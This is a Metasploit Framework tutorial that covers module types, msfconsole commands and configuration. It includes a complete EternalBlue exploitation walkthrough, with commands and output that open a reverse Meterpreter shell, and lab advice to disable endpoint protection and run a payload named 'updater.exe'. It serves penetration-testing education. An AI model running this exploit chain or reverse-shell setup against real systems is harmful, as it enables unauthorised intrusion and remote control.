# The Complete Metasploit Framework Interactive Masterclass

This single master reference manual covers everything from backend databases and module categories to navigational controls, multi-target execution pipelines, and clean-up tasks.

---

## 1. The Architectural Core: The Six Module Types

Metasploit organizes its extensive security toolkit into six primary categories. Every script or tool fits into one of these folders.

```text
+-----------------------------+

|    METASPLOIT FRAMEWORK     |
+-----------------------------+

               |
 +-------------+------------+------------+-------------+
 |             |            |            |             |
+------v------+ +------v------+ +------v------+ +------v------+

|  AUXILIARY  | |  EXPLOITS  | |  PAYLOADS  | |    POST     |
| Information | | Weaponized | |   Remote   | | Deep Inside |
|  Gathering  | |  Bypasses  | |  Control   | | Action Tools|
+-------------+ +-------------+ +-------------+ +-------------+

       |               |
+------v------+ +------v------+

|  ENCODERS  | |   EVASION   |
|  Bad Char   | | Custom Disk |
| Elimination | | Obfuscation |
+-------------+ +-------------+
```

### 🔍 Auxiliary Modules (The Scanners)
* **Purpose**: Tools used for reconnaissance, discovery, and network interaction. They send legitimate protocol requests to gather data without exploiting flaws.
* **Underlying Mechanics**: These modules implement raw protocol handles (such as Ruby `Rex::Proto` libraries for SMB, HTTP, or FTP). They communicate strictly within RFC specifications to parse server headers and track configuration states.
* **Detailed Actions**:
  * **Port Scanning**: Multi-threaded TCP/UDP connection mappings (`auxiliary/scanner/portscan/tcp`).
  * **Application Version Checks**: Reading service banners to match software release versions against vulnerability registries.
  * **Banner Grabbing**: Forcing remote applications to output identify tokens during socket handshakes.
  * **Network Fuzzing**: Injecting anomalous data streams into inputs to locate unhandled exceptions or crashes.
* **Payload Link**: They never drop or carry access payloads; their execution scope closes immediately upon completing the network query.

### 🔓 Exploit Modules (The Door Openers)
* **Purpose**: Code written to abuse a specific software vulnerability, misconfiguration, or programming error.
* **Underlying Mechanics**: Weaponizes target errors by sending precise data packages designed to alter execution flow. They manipulate system memory (e.g., overwriting Stack/Heap regions) or abuse logic flaws to redirect execution pointers directly into a staging area.
* **Detailed Actions**:
  * **Buffer Overflows**: Flooding application buffers to overwrite stack frames or instruction registers (`EIP`/`RIP`).
  * **Logic Faults**: Exploiting flawed access controls or authentication mechanisms to execute administrative functions without credentials.
  * **Command Injections**: Inserting system shell delimiters into vulnerable application input fields.
* **Payload Link**: Triggers a flaw in a system to break standard access rules, creating a temporary opening to execute an attached payload.

### 🕹️ Payload Modules (The Control Agents)
* **Purpose**: The code that runs on the target system once the exploit opens the entrance.
* **Underlying Mechanics**: Executes arbitrary machine code or scripts inside the target's operating system environment. It defines the mechanism used to maintain a stable command session.
* **Structural Types**:
  * **Inline / Singles**: Self-contained, all-in-one standalone binaries (e.g., `windows/shell_reverse_tcp`). They hold all instructions required to open a channel but are larger and more easily flagged by security filters.
  * **Staged Payloads**: Split into two parts to minimize initial footprint:
    * *Stager*: A tiny piece of highly optimized assembly code (usually under 500 bytes) that connects back to the framework and allocates a block of memory.
    * *Stage*: The main payload binary (like the large Meterpreter engine) streamed directly into that allocated memory block by the stager.
* **Detailed Actions**:
  * **Command Shells**: Spawning basic native interfaces (`cmd.exe` or `/bin/sh`).
  * **Meterpreter**: An advanced, memory-only interactive runtime environment that operates via encrypted Type-Length-Value (TLV) packets, avoiding disk detection.

### 🕵️ Post Modules (The Inspectors)
* **Purpose**: Tools executed after successful system validation and access confirmation.
* **Underlying Mechanics**: Runs natively through an established open session API. They use the access token or system privileges of the compromised host to automate host inspection tasks.
* **Detailed Actions**:
  * **Credential Gathering**: Parsing memory or local files to extract authentication secrets (`hashdump`, `mimikatz`).
  * **Network Enumeration**: Inspecting routing tables, ARP caches, and active connections to uncover internal networks.
  * **System Auditing**: Reviewing installed software, checking patch levels, taking screenshots, or recording keystrokes.

### 🔠 Encoders (The Translators)
* **Purpose**: Code built to eliminate restrictive bytes from being processed by target applications.
* **Underlying Mechanics**: Mathematically scrambles payload code blocks. If a target service crashes when encountering a null byte (`\x00`), the encoder applies a mathematical operation (like an XOR loop) to rewrite every instance of that byte.
* **Detailed Actions**:
  * **Bad Character Elimination**: Removing bytes that disrupt network buffers or application string operations.
  * **Runtime Restoration**: Prepends a small decoder stub to the payload. When executed, this stub runs the inverse math loop to rebuild the original payload directly inside memory right before it runs.

### 🎭 Evasion Modules (The Shufflers)
* **Purpose**: Automated layout engines designed to generate unique physical files that bypass basic file signatures.
* **Underlying Mechanics**: Unlike encoders (which modify memory strings), evasion modules manipulate the compilation structure of files written to a target's storage disk. 
* **Detailed Actions**:
  * **Polymorphic Layouts**: Inserting randomized code patterns, dead instructions (`NOPs`), or changing variable names.
  * **Encryption**: Wrapping payloads inside custom cryptographic layers (such as RC4 or AES) that decrypt only when specific environmental factors match.
  * **Signature Deflection**: Shifting file hashes and structure to prevent standard signature-matching systems from flagging the file on write.

---

## 2. Command-Line Reference & Workflow

When using `msfconsole`, navigation follows a structured step-by-step pipeline.

```text
+-------------------------------------------------------+

|                   GLOBAL MAIN MENU                    |
|                      (msf6 >)                         |
+-------------------------------------------------------+

     |                                             ^
     | 1. use [tool_name]                          | 3. back
     v                                             |
+-------------------------------------------------------+

|                 INSIDE A TOOL FOLDER                  |
|         (msf6 exploit(ms17_010...) >)                 |
+-------------------------------------------------------+

     |
     | 2. show options -> set [variable] -> check / exploit
     v
```

### 2.1 Starting and Preparing the Storage Layer
Metasploit relies on a PostgreSQL database backend to track infrastructure, open channels, host names, and evidence collected during validations.

Initialize database context (run within standard Linux console):
```bash
sudo msfdb init
```
*Mechanics: Configures a local PostgreSQL database instance, creates the `msf_user` role, establishes schema mappings, and spins up the web service framework.*

Access the main workspace shell:
```bash
msfconsole
```
*Mechanics: Loads the interactive environment, pools global exploit structures, and hooks into the initialized database subsystem.*

Confirm connectivity:
```text
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

Isolate data with workspaces:
```text
msf6 > workspace -a Security_Assessment
[+] Workspace: Security_Assessment

msf6 > workspace Security_Assessment
[*] Workspace: Security_Assessment
```
*Mechanics: The `-a` switch creates a new database partition. Selecting it switches your context so that all gathered hosts, credentials, and logs are saved exclusively within that project boundary.*

### 2.2 Global Search and Scoping Controls
`search`: Finds target modules across keywords, dates, platform paths, or vulnerability labels:
```text
msf6 > search type:exploit platform:windows smb
msf6 > search cve:2017-0144
```
*Mechanics: Queries the local index metadata cache. You can refine searches using attributes like `cve:`, `platform:`, `type:`, `author:`, or `name:` to narrow down your results quickly.*

`info`: Displays developer details, references, configuration definitions, and impact details for a specific module:
```text
msf6 > info exploit/windows/smb/ms17_010_eternalblue
```
*Mechanics: Extracts the module's inline documentation array. This provides a complete breakdown of what the module targets, side effects, CVE links, and a description of every configuration variable.*

### 2.3 Command Navigation, Configuration & Variable Modification
This section contains all primary commands required to configure, modify, reset, and navigate modules inside `msfconsole`.

### Navigation Commands

* **`use`**: Shifts your prompt from the global context into a specific module folder.
  ```text
  msf6 > use exploit/windows/smb/ms17_010_eternalblue
  msf6 exploit(windows/smb/ms17_010_eternalblue) >
  ```

* **`back`**: Safely leaves the active module context and returns you to the global root prompt (`msf6 >`).
  ```text
  msf6 exploit(windows/smb/ms17_010_eternalblue) > back
  msf6 >
  ```

* **`previous`**: Automatically loads the module that you were using immediately before your current selection. Helpful if you change contexts by mistake.
  ```text
  msf6 > previous
  msf6 exploit(windows/smb/ms17_010_eternalblue) >
  ```

### Inspection Commands

* **`show options`**: Displays the active configuration options table for the active module. This is your primary diagnostic map. You must examine the **Required** column; any line showing `yes` must contain a value before the framework allows execution.
  ```text
  msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

  Module options (exploit/windows/smb/ms17_010_eternalblue):

     Name           Current Setting  Required  Description
     ----           ---------------  --------  -----------
     RHOSTS                          yes       The target host(s), range CIDR or hosts file
     RPORT          445              yes       The SMB service port (TCP)
     SMBDomain      .                no        The Windows domain to use for authentication
  ```

* **`show advanced`**: Displays advanced runtime variables hidden from the standard `show options` view (e.g., connection timeouts, specific protocol tweaks, or advanced memory injection configurations).
  ```text
  msf6 exploit(windows/smb/ms17_010_eternalblue) > show advanced

  Module advanced options (exploit/windows/smb/ms17_010_eternalblue):

     Name           Current Setting  Required  Description
     ----           ---------------  --------  -----------
     CHOST                           no        The local client address to bind to
     CPORT                           no        The local client port to bind to
     WndResizeDelay 0                yes       Delay in seconds before window resize
  ```

* **`show targets`**: Lists all specific operating system variants, patch levels, or architectural targets supported explicitly by the weaponized module.
  ```text
  msf6 exploit(windows/smb/ms17_010_eternalblue) > show targets

  Exploit targets:

     Id  Name
     --  ----
     0   Windows 7 and Server 2008 R2 (x64) All Service Packs
  ```

* **`show payloads`**: Filters and displays only the payload modules compatible with your currently selected exploit and target architecture.
  ```text
  msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

  Compatible Payloads
  ===================

     Name                                 Description
     ----                                 -----------
     windows/x64/meterpreter/reverse_tcp  Inject the meterpreter server instance (staged)
     windows/x64/shell_reverse_tcp        Spawn a pipetalk native command shell (inline)
  ```

### Variable Configuration Commands

* **`set`**: Assigns a specific value to a configuration variable locally inside your active module scope.
  ```text
  msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.210.92.55
  RHOSTS => 10.210.92.55
  msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.210.92.20
  LHOST => 10.210.92.20
  msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
  LPORT => 4444
  ```
  * **RHOSTS**: Remote Hosts. The target network asset IP, CIDR block, or domain name being audited.
  * **LHOST**: Local Host. Your interface IP address where incoming connection traffic will report back.
  * **LPORT**: Local Port. The listening port bound on your system to intercept incoming payloads.

* **`setg`**: Assigns an option globally across all workspaces and modules. Use this to bind settings (like your local IP address) once so you do not have to retype them when swapping modules.
  ```text
  msf6 exploit(windows/smb/ms17_010_eternalblue) > setg LHOST 10.210.92.20
  LHOST => 10.210.92.20
  ```

* **`unset`**: Erases a previously assigned value from a local module variable, restoring it to an empty state or its factory default value.
  ```text
  msf6 exploit(windows/smb/ms17_010_eternalblue) > unset RHOSTS
  Unsetting RHOSTS...
  ```

* **`unsetg`**: Completely removes a globally configured option set by `setg`.
  ```text
  msf6 exploit(windows/smb/ms17_010_eternalblue) > unsetg LHOST
  Unsetting LHOST...
  ```

* **`set target`**: Manually locks the exploit module to point directly to a specific target version index discovered during `show targets`.
  ```text
  msf6 exploit(windows/smb/ms17_010_eternalblue) > set target 0
  target => 0
  ```

### 2.4 Execution and Verification

* **`check`**: Tests whether the target endpoint contains a specific software vulnerability without dropping code or triggering an exploit payload. This safely verifies flaws on critical systems.
  ```text
  msf6 exploit(windows/smb/ms17_010_eternalblue) > check
  [*] 10.210.92.55 - The target is vulnerable.
  ```
  * **Mechanics**: Sends a non-destructive probe (such as checking software version banners or testing specific data flags) to safely verify if the vulnerability exists without risking a system crash.

* **`exploit` / `run`**: Executes the active module configuration pipeline. Launches the primary code verification stream against the specified `RHOSTS` targets.
  ```text
  msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
  [*] Started reverse TCP handler on 10.210.92.20:4444 
  [*] Target welcomes connection.
  [*] Sending stage (200262 bytes) to 10.210.92.55
  [*] Meterpreter session 1 opened (10.210.92.20:4444 -> 10.210.92.55:49158)
  meterpreter > 
  ```

* **`exploit -j`**: Runs the task as an asynchronous background Job. This keeps your terminal prompt open for other activities while listeners wait for incoming connections.
  ```text
  msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -j
  [*] Exploit running as background job 0.
  ```
  * **Mechanics**: Spawns a background thread within the framework's runtime engine, allowing you to run other commands while the module handles connections independently.

### 3. Real-World Execution Scenarios (Step-by-Step Lab Setup)

For an effective environment, place your lab systems into an unmonitored state by disabling active firewalls and endpoint protection (e.g., turning off Windows Defender Firewall properties and mobile Play Protect policies) to focus entirely on core framework mechanics.

#### Reverse Connection Traffic Workflow
In a reverse connection setup, the target host establishes outbound communication back to your system. This layout helps safely track communication lines across complex networks without needing to reconfigure external perimeter routing rules.

```text
+-------------------+                      +-------------------+

|    Kali Linux     |                      |Target Environment |
|   10.210.92.20    |<== Inbound Call =====|   10.210.92.55    |
+-------------------+      (Port 4444)     +-------------------+

| Active Listener   |                      |  File Execution:  |
|  (multi/handler)  |                      |   updater.exe     |
+-------------------+                      +-------------------+
```
